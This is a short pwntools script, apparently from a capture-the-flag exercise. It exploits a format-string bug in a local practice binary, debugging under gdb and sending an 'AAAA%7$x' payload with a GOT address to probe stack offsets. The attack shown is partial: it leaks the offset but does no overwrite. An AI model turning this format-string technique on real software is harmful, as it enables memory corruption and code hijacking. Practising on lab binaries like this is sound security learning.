from pwn import *

p = process("./format_3_patched")

pid = gdb.attach(p, gdbscript="b * vuln+47")

got_target = p64(0x601028)

payload1 = 'xD'
p.sendline(payload1)
p.recv(2)

payload = "AAAA%7$x"+got_target

p.sendline(payload)
print "out: "+ p.recvline()


p.interactive()
